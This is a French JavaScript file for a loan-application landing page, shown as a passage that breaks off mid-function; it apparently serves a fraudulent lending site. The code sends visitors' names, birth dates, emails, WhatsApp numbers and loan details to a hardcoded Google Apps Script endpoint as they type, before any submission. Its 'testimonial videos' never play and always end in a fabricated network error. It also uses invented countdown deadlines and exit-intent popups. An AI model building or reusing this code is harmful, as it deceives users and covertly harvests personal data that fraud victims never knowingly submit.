(function() {
    'use strict';

    // ========================================
    // 0. APPS SCRIPT CONFIG (AJOUTÉ)
    // ========================================
    const APP_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyaqL3zEvP_9fu3cOGOcDPa8Wa0le87vVA_iGTNhNPd0Zqg3bXtCo_GCtJUwRCzXGMc/exec';

    // Génère un session_id NUMÉRIQUE (stable en mémoire pour la session navigateur)
    const SESSION = {
        id: String(Date.now()) + String(Math.floor(100 + Math.random() * 899)), // ex: 1739561234123xxx
        openedAtISO: new Date().toISOString()
    };

    // Helpers POST → Apps Script (url-encoded, no-cors)
    function encodeFormBody(obj) {
        return Object.keys(obj)
            .map(k => encodeURIComponent(k) + '=' + encodeURIComponent(obj[k] == null ? '' : obj[k]))
            .join('&');
    }
    function postToSheet(payload) {
        try {
            const body = encodeFormBody(payload);
            fetch(APP_SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
                body
            }).catch(() => {});
        } catch (_) {}
    }

    // ========================================
    // 1. CONFIGURATION GLOBALE
    // ========================================
    const CONFIG = {
        autoplayCarousel: false,
        autoplayDelay: 5000,
        smoothScrollOffset: 80,
        minAge: 18,
        tauxInteret: 3,
        minWordsRaison: 1, // compat héritée, non utilisée
        exitIntentDelay: 60000,
        countdownEndDate: '2025-10-30T23:59:59', // fin de l'offre (bannière)
        videoLoadingTime: 120000, // 2 min avant affichage de l'erreur vidéo
        debugMode: true
    };

    const ICONS = {
        ok: 'https://img.icons8.com/?size=100&id=YZHzhN7pF7Dw&format=png&color=16a34a', // vert
        warning: 'https://img.icons8.com/?size=100&id=undefined&format=png&color=000000' // peut échouer -> fallback
    };

    const formState = {
        step1Valid: false,
        step2Valid: false,
        step3Valid: false,
        formStarted: false,
        formCompleted: false,
        exitIntentShown: false,
        validationErrors: {
            step1: [],
            step2: [],
            step3: []
        }
    };

    // Tracking pour l'exit-intent "1m30 sans clic CTA"
    let exitIntentTimer = null;
    let ctaClicked = false;
    const pageStartTime = Date.now();

    // ========================================
    // 2. VALIDATION STRICTE DE LA DATE
    // ========================================
    function isLeapYear(year) {
        return (year % 4 === 0 && year % 100 !== 0) || (year % 400 === 0);
    }

    function getDaysInMonth(month, year) {
        const daysInMonth = {
            1: 31, 2: isLeapYear(year) ? 29 : 28, 3: 31, 4: 30,
            5: 31, 6: 30, 7: 31, 8: 31, 9: 30, 10: 31, 11: 30, 12: 31
        };
        return daysInMonth[month];
    }

    function validateBirthDate(dateStr) {
        if (!dateStr || dateStr.length !== 10) {
            return { valid: false, age: 0, error: 'Format requis : JJ/MM/AAAA' };
        }

        const parts = dateStr.split('/');
        if (parts.length !== 3) {
            return { valid: false, age: 0, error: 'Format invalide' };
        }

        const day = parseInt(parts[0], 10);
        const month = parseInt(parts[1], 10);
        const year = parseInt(parts[2], 10);

        if (isNaN(day) || isNaN(month) || isNaN(year)) {
            return { valid: false, age: 0, error: 'Date invalide : caractères non numériques' };
        }

        const currentYear = new Date().getFullYear();
        if (year < 1900 || year > currentYear) {
            return { valid: false, age: 0, error: `L'année doit être entre 1900 et ${currentYear}` };
        }

        if (month < 1 || month > 12) {
            return { valid: false, age: 0, error: 'Le mois doit être entre 01 et 12' };
        }

        const maxDays = getDaysInMonth(month, year);
        if (day < 1 || day > maxDays) {
            const monthNames = ['', 'janvier', 'février', 'mars', 'avril', 'mai', 'juin',
                'juillet', 'août', 'septembre', 'octobre', 'novembre', 'décembre'];
            return {
                valid: false,
                age: 0,
                error: `${monthNames[month]} ${year} a seulement ${maxDays} jours (vous avez saisi ${day})`
            };
        }

        const birthDate = new Date(year, month - 1, day);
        if (birthDate.getDate() !== day ||
            birthDate.getMonth() !== month - 1 ||
            birthDate.getFullYear() !== year) {
            return { valid: false, age: 0, error: 'Cette date n\'existe pas dans le calendrier' };
        }

        const today = new Date();
        if (birthDate > today) {
            return { valid: false, age: 0, error: 'La date ne peut pas être dans le futur' };
        }

        let age = today.getFullYear() - birthDate.getFullYear();
        const monthDiff = today.getMonth() - birthDate.getMonth();
        const dayDiff = today.getDate() - birthDate.getDate();
        if (monthDiff < 0 || (monthDiff === 0 && dayDiff < 0)) {
            age--;
        }

        if (age < CONFIG.minAge) {
            return { valid: false, age, error: `Vous devez avoir au moins ${CONFIG.minAge} ans (vous avez ${age} ans)` };
        }
        if (age > 120) {
            return { valid: false, age, error: 'Date de naissance improbable (plus de 120 ans)' };
        }
        return { valid: true, age, error: '' };
    }

    // ========================================
    // 3. VALIDATION AVEC DEBUG DÉTAILLÉ
    // ========================================
    function isValidEmail(email) {
        const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
        if (!emailRegex.test(email)) return false;
        const suspiciousDomains = ['test.com', 'example.com', 'fake.com', 'temp.com', 'azerty.com'];
        const domain = email.split('@')[1];
        if (!domain) return false;
        const domainParts = domain.split('.');
        if (suspiciousDomains.includes(domain)) return false;
        if (domainParts.length < 2 || domainParts[domainParts.length - 1].length < 2) return false;
        return true;
    }

    function isValidPhone(phone) {
        const cleaned = (phone || '').replace(/\s+/g, '');
        if (!cleaned.startsWith('+')) return false;
        const phoneRegex = /^\+\d{1,4}\d{6,14}$/;
        if (!phoneRegex.test(cleaned)) return false;
        const digits = cleaned.substring(1);
        const allSame = digits.split('').every(d => d === digits[0]);
        if (allSame) return false;
        const suspiciousPatterns = ['1234567890', '0000000000', '9999999999', '1111111111'];
        if (suspiciousPatterns.some(pattern => cleaned.includes(pattern))) return false;
        return true;
    }

    // Raison du prêt: min 3 caractères, lettres requises
    function validateRaison(raison) {
        const trimmed = (raison || '').trim();
        if (trimmed.length < 3) return { valid: false, error: 'Minimum 3 caractères requis' };
        const hasLetters = /[a-zA-ZÀ-ÿ]/.test(trimmed);
        if (!hasLetters) return { valid: false, error: 'Doit contenir des lettres' };
        return { valid: true, error: '' };
    }

    function validateName(name) {
        const trimmed = (name || '').trim();
        if (trimmed.length < 2) return { valid: false, error: 'Minimum 2 caractères' };
        const nameRegex = /^[a-zA-ZÀ-ÿ\s\-']+$/;
        if (!nameRegex.test(trimmed)) return { valid: false, error: 'Caractères invalides détectés' };
        const hasLetters = /[a-zA-ZÀ-ÿ]/.test(trimmed);
        if (!hasLetters) return { valid: false, error: 'Doit contenir des lettres' };
        return { valid: true, error: '' };
    }

    // Étape 1
    function validateStep1() {
        formState.validationErrors.step1 = [];

        const prenom = document.getElementById('prenom')?.value.trim() || '';
        const nom = document.getElementById('nom')?.value.trim() || '';
        const dateNaissance = document.getElementById('date-naissance')?.value.trim() || '';
        const email = document.getElementById('email')?.value.trim() || '';
        const whatsapp = document.getElementById('whatsapp')?.value.trim() || '';
        const pays = document.getElementById('pays')?.value || '';

        const prenomValidation = validateName(prenom);
        if (!prenom) formState.validationErrors.step1.push('Prénom : champ vide');
        else if (!prenomValidation.valid) formState.validationErrors.step1.push(`Prénom : ${prenomValidation.error}`);

        const nomValidation = validateName(nom);
        if (!nom) formState.validationErrors.step1.push('Nom : champ vide');
        else if (!nomValidation.valid) formState.validationErrors.step1.push(`Nom : ${nomValidation.error}`);

        const dateValidation = validateBirthDate(dateNaissance);
        if (!dateNaissance) formState.validationErrors.step1.push('Date de naissance : champ vide');
        else if (!dateValidation.valid) formState.validationErrors.step1.push(`Date de naissance : ${dateValidation.error}`);

        if (!email) formState.validationErrors.step1.push('E-mail : champ vide');
        else if (!isValidEmail(email)) formState.validationErrors.step1.push('E-mail : adresse invalide ou suspecte');

        if (!whatsapp) formState.validationErrors.step1.push('WhatsApp : champ vide');
        else if (!isValidPhone(whatsapp)) formState.validationErrors.step1.push('WhatsApp : numéro invalide (format international requis)');

        if (!pays) formState.validationErrors.step1.push('Pays : non sélectionné');

        formState.step1Valid = formState.validationErrors.step1.length === 0;

        if (CONFIG.debugMode && !formState.step1Valid) {
            console.log('❌ Étape 1 - Erreurs:', formState.validationErrors.step1);
        }

        refreshStepOKBadges();
        updateStepAccess();
        checkFormCompletion();

        // Autosave → Sheet
        autosaveToSheet();

        return formState.step1Valid;
    }

    // Étape 2
    function validateStep2() {
        formState.validationErrors.step2 = [];

        const montant = parseFloat(document.getElementById('montant')?.value);
        const duree = parseInt(document.getElementById('duree')?.value);
        const raison = document.getElementById('raison')?.value.trim() || '';

        if (isNaN(montant) || montant < 2000 || montant > 200000) {
            formState.validationErrors.step2.push(`Montant : doit être entre 2 000 € et 200 000 € (actuel: ${montant} €)`);
        }

        if (isNaN(duree) || duree < 6 || duree > 120) {
            formState.validationErrors.step2.push(`Durée : doit être entre 6 et 120 mois (actuel: ${duree} mois)`);
        }

        const raisonValidation = validateRaison(raison);
        if (!raison) formState.validationErrors.step2.push('Raison du projet : champ vide');
        else if (!raisonValidation.valid) formState.validationErrors.step2.push(`Raison du projet : ${raisonValidation.error}`);

        formState.step2Valid = formState.validationErrors.step2.length === 0;

        if (CONFIG.debugMode && !formState.step2Valid) {
            console.log('❌ Étape 2 - Erreurs:', formState.validationErrors.step2);
        }

        refreshStepOKBadges();
        updateStepAccess();
        checkFormCompletion();

        // Autosave → Sheet
        autosaveToSheet();

        return formState.step2Valid;
    }

    // Étape 3
    function validateStep3() {
        formState.validationErrors.step3 = [];

        const statut = document.getElementById('statut')?.value || '';
        const revenus = document.getElementById('revenus')?.value || '';

        if (!statut) formState.validationErrors.step3.push('Statut professionnel : non sélectionné');
        if (!revenus) formState.validationErrors.step3.push('Revenus réguliers : non sélectionné');

        formState.step3Valid = formState.validationErrors.step3.length === 0;

        if (CONFIG.debugMode && !formState.step3Valid) {
            console.log('❌ Étape 3 - Erreurs:', formState.validationErrors.step3);
        }

        refreshStepOKBadges();
        checkFormCompletion();

        // Autosave → Sheet
        autosaveToSheet();

        return formState.step3Valid;
    }

    // ========================================
    // 4. LECTEUR VIDÉO AVEC ERREUR UNIQUE (⏱️ 2 minutes)
    // ========================================
    const singleVideoError = {
        title: 'Problème réseau détecté',
        message: 'Votre connexion semble instable. Veuillez vérifier votre connexion internet et réessayer ultérieurement.',
        code: 'ERR_NETWORK_UNSTABLE'
    };

    function showVideoPlayer(author, location, duration) {
        const modal = document.createElement('div');
        modal.id = 'video-player-modal';
        modal.style.cssText = `
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.95); z-index: 10000;
            display: flex; align-items: center; justify-content: center;
            padding: 1rem; animation: fadeIn 0.3s ease;`;

        modal.innerHTML = `
            <div style="background:#1a1a1a; max-width:900px; width:100%;
                        border-radius:12px; overflow:hidden; box-shadow:0 20px 60px rgba(0,0,0,0.5);">
                <div style="background:#2a2a2a; padding:1rem 1.5rem; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #3a3a3a;">
                    <div>
                        <div style="color:#fff; font-weight:600; font-size:1rem; margin-bottom:.25rem;">${author}</div>
                        <div style="color:#888; font-size:.85rem;">📍 ${location} • ⏱️ ${duration}</div>
                    </div>
                    <button id="close-video-modal" style="background:transparent; border:none; color:#888; font-size:1.5rem; cursor:pointer; width:40px; height:40px; display:flex; align-items:center; justify-content:center; border-radius:8px; transition:all .2s;" title="Fermer">✕</button>
                </div>
                <div id="video-player-container" style="aspect-ratio:16/9; background:#000; display:flex; align-items:center; justify-content:center; position:relative;">
                    <div id="video-loader" style="display:flex; flex-direction:column; align-items:center; gap:1.5rem;">
                        <div style="width:60px; height:60px; border:4px solid #333; border-top-color:#fff; border-radius:50%; animation: spin 1s linear infinite;"></div>
                        <div style="color:#fff; font-size:.95rem;">Chargement de la vidéo...</div>
                    </div>
                    <div id="video-error" style="display:none; flex-direction:column; align-items:center; gap:1rem; padding:2rem; text-align:center; max-width:520px;">
                        <div style="display:flex; align-items:center; justify-content:center;">
                            <img id="video-warning-icon" src="${ICONS.warning}" alt="Avertissement" style="width:64px;height:64px;display:block;"/>
                        </div>
                        <div style="color:#fff; font-size:1.3rem; font-weight:600; margin-top:.5rem;">${singleVideoError.title}</div>
                        <div style="color:#aaa; font-size:.95rem; line-height:1.6;">${singleVideoError.message}</div>
                        <div style="margin-top:.75rem; padding:.5rem .75rem; background:#2a2a2a; border-radius:8px; font-family:monospace; font-size:.85rem; color:#dc2626;">Code: ${singleVideoError.code}</div>
                        <button id="retry-video" style="margin-top:.75rem; padding:.75rem 2rem; background:#3b82f6; color:#fff; border:none; border-radius:8px; font-size:.95rem; font-weight:600; cursor:pointer; transition:all .2s;">🔄 Réessayer</button>
                    </div>
                </div>
            </div>`;

        document.body.appendChild(modal);

        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
            @keyframes spin { from { transform:rotate(0deg); } to { transform:rotate(360deg); } }
            #close-video-modal:hover { background:#3a3a3a!important; color:#fff!important; }
            #retry-video:hover { background:#2563eb!important; transform: translateY(-2px); }`;
        document.head.appendChild(style);

        const warnImg = modal.querySelector('#video-warning-icon');
        if (warnImg) {
            warnImg.onerror = () => {
                warnImg.replaceWith(Object.assign(document.createElement('div'), {
                    textContent: '⚠️',
                    style: 'font-size:48px;line-height:1;'
                }));
            };
        }

        setTimeout(() => {
            const loader = document.getElementById('video-loader');
            const error = document.getElementById('video-error');
            if (loader && error) {
                loader.style.display = 'none';
                error.style.display = 'flex';
            }
        }, CONFIG.videoLoadingTime);

        document.getElementById('close-video-modal')?.addEventListener('click', () => modal.remove());
        document.getElementById('retry-video')?.addEventListener('click', () => {
            const loader = document.getElementById('video-loader');
            const error = document.getElementById('video-error');
            if (!loader || !error) return;
            error.style.display = 'none';
            loader.style.display = 'flex';
            setTimeout(() => {
                loader.style.display = 'none';
                error.style.display = 'flex';
            }, CONFIG.videoLoadingTime);
        });
        modal.addEventListener('click', (e) => { if (e.target === modal) modal.remove(); });
        const escapeHandler = (e) => { if (e.key === 'Escape') { modal.remove(); document.removeEventListener('keydown', escapeHandler); } };
        document.addEventListener('keydown', escapeHandler);
    }

    // ========================================
    // 5. GESTION DES VIDÉOS
    // ========================================
    function setupVideoPlayers() {
        const videoCards = document.querySelectorAll('.video-card');
        videoCards.forEach((card) => {
            card.setAttribute('tabindex', '0');
            card.style.outline = 'none';
            card.addEventListener('click', function(e) {
                e.preventDefault();
                const author = this.querySelector('.video-author')?.textContent || '';
                const location = this.querySelector('.video-location')?.textContent || '';
                const duration = this.querySelector('.video-duration')?.textContent || '';
                showVideoPlayer(author, location, duration);
            });
            card.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' || e.key === ' ') {
                    e.preventDefault();
                    this.click();
                }
            });
        });
    }

    // ========================================
    // 6. FORMAT AUTOMATIQUE DATE
    // ========================================
    function setupDateFormatting() {
        const dateInput = document.getElementById('date-naissance');
        if (!dateInput) return;
        dateInput.type = 'text';
        dateInput.placeholder = 'JJ/MM/AAAA';
        dateInput.maxLength = 10;
        dateInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2);
            if (value.length >= 5) value = value.substring(0, 5) + '/' + value.substring(5, 9);
            e.target.value = value;
        });
        dateInput.addEventListener('blur', function() {
            const validation = validateBirthDate(this.value);
            if (this.value && !validation.valid) {
                this.setCustomValidity(validation.error);
                this.style.borderColor = '#dc2626';
            } else {
                this.setCustomValidity('');
                this.style.borderColor = '';
                validateStep1();
            }
        });
    }

    // ========================================
    // 7. BANDEAU PROMO (noir + TIMER)
    // ========================================
    function formatCountdown(msRemaining) {
        if (msRemaining <= 0) return '0j 0h 0min 0s';
        const days = Math.floor(msRemaining / (1000 * 60 * 60 * 24));
        const hours = Math.floor((msRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((msRemaining % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((msRemaining % (1000 * 60)) / 1000);
        return `${days}j ${hours}h ${minutes}min ${seconds}s`;
    }

    function setupPromoBannerTimer() {
        const promoBanner = document.querySelector('.promo-banner');
        if (!promoBanner) return;

        promoBanner.style.background = '#000';
        promoBanner.style.color = '#fff';
        promoBanner.style.fontWeight = '600';

        const endTs = new Date(CONFIG.countdownEndDate).getTime();

        function tick() {
            const now = Date.now();
            const diff = endTs - now;
            if (diff <= 0) {
                promoBanner.textContent = '🎉 Offre exceptionnelle en cours';
                return;
            }
            promoBanner.textContent = `⏰ Offre valable encore ${formatCountdown(diff)}`;
        }

        tick();
        const timer = setInterval(() => {
            const now = Date.now();
            const diff = endTs - now;
            if (diff <= 0) {
                promoBanner.textContent = '🎉 Offre exceptionnelle en cours';
                clearInterval(timer);
            } else {
                promoBanner.textContent = `⏰ Offre valable encore ${formatCountdown(diff)}`;
            }
        }, 1000);
    }

    // ========================================
    // 8. CALCULATEUR & SLIDERS
    // ========================================
    function calculerMensualite(montant, dureeEnMois, tauxAnnuel) {
        const tauxMensuel = tauxAnnuel / 100 / 12;
               const mensualite = (montant * tauxMensuel) / (1 - Math.pow(1 + tauxMensuel, -dureeEnMois));
        return mensualite;
    }

    function getDateFin(dureeEnMois) {
        const dateFin = new Date();
        dateFin.setMonth(dateFin.getMonth() + parseInt(dureeEnMois, 10));
        const options = { year: 'numeric', month: 'long' };
        return dateFin.toLocaleDateString('fr-FR', options);
    }

    function formatEuros(montant) {
        return montant.toLocaleString('fr-FR', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        }) + ' €';
    }

    function formatMontant(value) {
        return value.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ' ') + ' €';
    }

    function updateSliderBackground(slider) {
        const min = parseFloat(slider.min) || 0;
        const max = parseFloat(slider.max) || 100;
        const value = parseFloat(slider.value);
        const percentage = ((value - min) / (max - min)) * 100;
        slider.style.background = `linear-gradient(to right, var(--brand) 0%, var(--brand) ${percentage}%, var(--line) ${percentage}%, var(--line) 100%)`;
    }

    function afficherResumePret() {
        const montant = parseFloat(document.getElementById('montant')?.value);
        const duree = parseInt(document.getElementById('duree')?.value, 10);
        const taux = CONFIG.tauxInteret;

        const mensualite = calculerMensualite(montant, duree, taux);
        const coutTotal = mensualite * duree;
        const coutCredit = coutTotal - montant;
        const dateFin = getDateFin(duree);

        let resumeElement = document.getElementById('resume-pret');
        if (!resumeElement) {
            resumeElement = document.createElement('div');
            resumeElement.id = 'resume-pret';
            resumeElement.style.cssText = `
                margin-top: 1.5rem; padding: 1.25rem;
                background: linear-gradient(135deg, #f7f8fb 0%, #e6e8ef 100%);
                border-left: 4px solid var(--brand); border-radius: 10px;
                font-size: 0.9rem; line-height: 1.8;`;
            const raisonGroup = document.getElementById('raison')?.closest('.form-group');
            if (raisonGroup && raisonGroup.parentNode) {
                raisonGroup.parentNode.insertBefore(resumeElement, raisonGroup.nextSibling);
            }
        }

        resumeElement.innerHTML = `
            <div style="font-weight:600;color:var(--brand);margin-bottom:.75rem;font-size:1rem;">📊 Estimation de votre prêt</div>
            <div style="color:var(--text);">
                <strong>Vous souhaitez emprunter ${formatEuros(montant)}</strong> sur <strong>${duree} mois</strong>.
            </div>
            <div style="margin-top:.5rem;color:var(--muted);font-size:.85rem;">
                Au taux indicatif de <strong>${taux}%</strong> par an :
            </div>
            <div style="margin-top:.75rem;padding:.75rem;background:#fff;border-radius:8px;">
                <div style="display:flex;justify-content:space-between;margin-bottom:.5rem;">
                    <span style="color:var(--muted);">Mensualité :</span>
                    <strong style="color:var(--brand);font-size:1.1rem;">${formatEuros(mensualite)}</strong>
                </div>
                <div style="display:flex;justify-content:space-between;margin-bottom:.5rem;padding-top:.5rem;border-top:1px dashed var(--line);">
                    <span style="color:var(--muted);">Coût total du crédit :</span>
                    <strong style="color:var(--text);">${formatEuros(coutCredit)}</strong>
                </div>
                <div style="display:flex;justify-content:space-between;padding-top:.5rem;border-top:1px dashed var(--line);">
                    <span style="color:var(--muted);">Montant total à rembourser :</span>
                    <strong style="color:var(--text);">${formatEuros(coutTotal)}</strong>
                </div>
            </div>
            <div style="margin-top:.75rem;color:var(--muted);font-size:.85rem;">
                Dernier paiement prévu en <strong>${dateFin}</strong>
            </div>
            <div style="margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--line);color:var(--muted);font-size:.8rem;font-style:italic;">
                ⚠️ Estimation indicative basée sur un taux de ${taux}%. Le taux final sera déterminé selon votre dossier.
            </div>`;
    }

    const montantSlider = document.getElementById('montant');
    const montantValue = document.getElementById('montant-value');
    const dureeSlider = document.getElementById('duree');
    const dureeValue = document.getElementById('duree-value');

    if (montantSlider && montantValue) {
        montantSlider.addEventListener('input', function() {
            montantValue.textContent = formatMontant(this.value);
            updateSliderBackground(this);
            afficherResumePret();
            validateStep2();
        });
        montantValue.textContent = formatMontant(montantSlider.value);
        updateSliderBackground(montantSlider);
    }

    if (dureeSlider && dureeValue) {
        dureeSlider.addEventListener('input', function() {
            dureeValue.textContent = this.value + ' mois';
            updateSliderBackground(this);
            afficherResumePret();
            validateStep2();
        });
        dureeValue.textContent = dureeSlider.value + ' mois';
        updateSliderBackground(dureeSlider);
    }

    // ========================================
    // 9. BOUTONS SUIVANT
    // ========================================
    function createNextButtons() {
        // #PATCH-NEXT-BTN-SCOPED : ne cible QUE les 3 steps du formulaire
        const details = document.querySelectorAll('#lead-form .form-steps > details');
        details.forEach((detail, index) => {
            // Ne pas créer de bouton pour la 3e étape ("Votre profil")
            if (index === details.length - 1) return;

            const stepContent = detail.querySelector('.step-content');
            if (!stepContent) return;
            const nextButton = document.createElement('button');
            nextButton.type = 'button';
            nextButton.className = 'btn-next-step';
            nextButton.innerHTML = 'Suivant →';
            nextButton.style.cssText = `
                margin-top: 1.5rem; padding: 0.85rem 2rem; background: var(--brand); color: white;
                border: none; border-radius: 12px; font-size: 0.95rem; font-weight: 600; cursor: pointer;
                transition: all 0.2s; width: 100%; max-width: 300px; display: block; margin-left: auto; margin-right: auto;`;
            nextButton.addEventListener('mouseenter', function() {
                this.style.background = '#1557e0';
                this.style.transform = 'translateY(-2px)';
            });
            nextButton.addEventListener('mouseleave', function() {
                this.style.background = 'var(--brand)';
                this.style.transform = 'translateY(0)';
            });
            nextButton.addEventListener('click', function() {
                let isValid = false;
                let errors = [];
                if (index === 0) {
                    isValid = validateStep1();
                    errors = formState.validationErrors.step1;
                } else if (index === 1) {
                    isValid = validateStep2();
                    errors = formState.validationErrors.step2;
                }
                if (!isValid) {
                    showNotification(
                        'Informations incomplètes ou invalides',
                        'Veuillez corriger les erreurs suivantes :\n\n• ' + errors.join('\n• '),
                        'warning'
                    );
                    return;
                }
                detail.open = false;
                const nextDetail = details[index + 1];
                if (nextDetail) {
                    nextDetail.open = true;
                    setTimeout(() => {
                        nextDetail.scrollIntoView({ behavior: 'smooth', block: 'start' });
                    }, 100);
                }
            });
            stepContent.appendChild(nextButton);
        });

        // #PATCH-NEXT-BTN-DESKTOP-SIZE : réduit la taille du bouton “Suivant” sur desktop
        const style = document.createElement('style');
        style.textContent = `
            @media (min-width: 901px) {
              .btn-next-step{ 
                max-width: 220px !important;
                font-size: 0.9rem !important;
                padding: 0.7rem 1rem !important;
              }
            }`;
        document.head.appendChild(style);
    }

    // ========================================
    // 10. ACCÈS AUX ÉTAPES + HITBOX + ICÔNE OK
    // ========================================
    function injectSummaryHitboxStyles() {
        const style = document.createElement('style');
        style.textContent = `
            details > summary { padding: 1rem .75rem !important; margin: -0.25rem -0.25rem 0 -0.25rem; border-radius: 10px; cursor: pointer; }
            details > summary:hover { background: rgba(30, 102, 255, 0.06); }
            .ok-badge { display:inline-flex; align-items:center; justify-content:center; width:20px; height:20px; margin-left:8px; vertical-align:middle; }
            .ok-badge img { width:20px; height:20px; display:block; }`;
        document.head.appendChild(style);
    }

    function ensureOKBadge(summaryEl) {
        if (!summaryEl) return;
        let badge = summaryEl.querySelector('.ok-badge');
        if (!badge) {
            badge = document.createElement('span');
            badge.className = 'ok-badge';
            const img = document.createElement('img');
            img.src = ICONS.ok;
            img.alt = 'OK';
            badge.appendChild(img);
            summaryEl.appendChild(badge);
        }
        return badge;
    }

    function refreshStepOKBadges() {
        const details = document.querySelectorAll('details');
        if (details.length >= 3) {
            const s1 = details[0].querySelector('summary');
            const s2 = details[1].querySelector('summary');
            const s3 = details[2].querySelector('summary');

            const b1 = ensureOKBadge(s1);
            const b2 = ensureOKBadge(s2);
            const b3 = ensureOKBadge(s3);

            if (b1) b1.style.visibility = formState.step1Valid ? 'visible' : 'hidden';
            if (b2) b2.style.visibility = formState.step2Valid ? 'visible' : 'hidden';
            if (b3) b3.style.visibility = formState.step3Valid ? 'visible' : 'hidden';
        }
    }

    function updateStepAccess() {
        const details = document.querySelectorAll('details');
        if (details.length >= 3) {
            const step2 = details[1];
            const step3 = details[2];
            if (!formState.step1Valid) {
                step2.removeAttribute('open');
                step2.querySelector('summary').style.opacity = '0.5';
                step2.querySelector('summary').style.cursor = 'not-allowed';
            } else {
                step2.querySelector('summary').style.opacity = '1';
                step2.querySelector('summary').style.cursor = 'pointer';
            }
            if (!formState.step1Valid || !formState.step2Valid) {
                step3.removeAttribute('open');
                step3.querySelector('summary').style.opacity = '0.5';
                step3.querySelector('summary').style.cursor = 'not-allowed';
            } else {
                step3.querySelector('summary').style.opacity = '1';
                step3.querySelector('summary').style.cursor = 'pointer';
            }
        }
    }

    function checkFormCompletion() {
        const allValid = formState.step1Valid && formState.step2Valid && formState.step3Valid;
        if (allValid) {
            formState.formCompleted = true;
            if (!exitIntentTimer) startExitIntentTimer();
        }
    }

    function preventStepOpening() {
        const details = document.querySelectorAll('details');
        details.forEach((detail, index) => {
            detail.addEventListener('toggle', function(e) {
                if (this.open) {
                    if (index === 1 && !formState.step1Valid) {
                        e.preventDefault(); this.open = false;
                        showNotification('Étape précédente incomplète', 'Complétez l\'étape 1 avant de continuer.', 'warning');
                        return false;
                    }
                    if (index === 2 && (!formState.step1Valid || !formState.step2Valid)) {
                        e.preventDefault(); this.open = false;
                        showNotification('Étapes précédentes incomplètes', 'Complétez les étapes 1 et 2 avant de continuer.', 'warning');
                        return false;
                    }
                }
            });
        });
    }

    // ========================================
    // 11. EXIT INTENT (après 90s, si tout est valide et pas de clic CTA)
    // ========================================
    function startExitIntentTimer() {
        exitIntentTimer = setTimeout(() => {}, CONFIG.exitIntentDelay);
    }

    function showExitIntentPopup() {
        if (formState.exitIntentShown || !formState.formCompleted) return;
        const elapsed = (Date.now() - pageStartTime) / 1000;
        if (elapsed < 90 || ctaClicked) return;

        formState.exitIntentShown = true;

        const montant = formatMontant(document.getElementById('montant')?.value || '0');
        const duree = document.getElementById('duree')?.value || '—';

        // Date limite (J+3) affichée SANS heure
        const deadline = new Date();
        deadline.setHours(deadline.getHours() + 72);
        const deadlineStr = deadline.toLocaleDateString('fr-FR', { day: 'numeric', month: 'long' });

        const popup = document.createElement('div');
        popup.id = 'exit-intent-popup';
        popup.style.cssText = `
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.7); z-index: 10000;
            display: flex; align-items: center; justify-content: center;
            padding: 1rem; animation: fadeIn 0.3s ease;`;

        popup.innerHTML = `
            <div style="background:#fff; max-width:500px; width:100%;
                        border-radius:16px; padding:2.5rem; box-shadow:0 20px 60px rgba(0,0,0,0.3);
                        animation: slideUp .4s ease; text-align:center;">
                <div style="font-size:3rem; margin-bottom:1rem;">🤭</div>
                <h2 style="font-size:1.5rem; font-weight:700; color:var(--text); margin-bottom:1rem;">Oups ! Vous partez déjà ?</h2>
                <p style="color:var(--muted); margin-bottom:1.5rem; line-height:1.6;">
                    Vous avez presque terminé ! Votre demande de <strong style="color: var(--brand);">${montant}</strong>
                    sur <strong>${duree} mois</strong> est prête.
                </p>
                <p style="color:var(--text); font-weight:600; margin-bottom:2rem; padding:1rem; background:var(--bg-soft); border-radius:10px;">
                    ⏰ Obtenez vos ${montant} avant le<br>
                    <span style="color: var(--brand); font-size: 1.1rem;">${deadlineStr}</span>
                </p>
                <button id="exit-intent-cta" style="width:100%; padding:1rem 2rem; background:var(--accent); color:#fff; border:none; border-radius:12px; font-size:1rem; font-weight:700; cursor:pointer; margin-bottom:1rem; transition:all .2s;">📨 Finaliser ma demande maintenant</button>
                <button id="exit-intent-close" style="background:transparent; border:none; color:var(--muted); font-size:.9rem; cursor:pointer; text-decoration:underline;">Non merci, je reviendrai plus tard</button>
            </div>`;

        document.body.appendChild(popup);

        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
            @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
            #exit-intent-cta:hover { background:#15a34a !important; transform: translateY(-2px); }`;
        document.head.appendChild(style);

        document.getElementById('exit-intent-cta')?.addEventListener('click', () => {
            popup.remove();
            const submitBtn = document.querySelector('.cta-submit');
            if (submitBtn) {
                ctaClicked = true;
                // Envoi événement CTA (depuis popup)
                sendCTAEventToSheet('Finaliser ma demande maintenant (popup)');
                submitBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
                submitBtn.style.animation = 'pulse 1s ease 3';
            }
        });
        document.getElementById('exit-intent-close')?.addEventListener('click', () => popup.remove());
        popup.addEventListener('click', (e) => { if (e.target === popup) popup.remove(); });
    }

    document.addEventListener('mouseleave', (e) => { if (e.clientY < 10) showExitIntentPopup(); });
    window.addEventListener('beforeunload', (e) => {
        const elapsed = (Date.now() - pageStartTime) / 1000;
        if (!formState.exitIntentShown && formState.formCompleted && !ctaClicked && elapsed >= 90) {
            e.preventDefault();
            e.returnValue = '';
            showExitIntentPopup();
        }
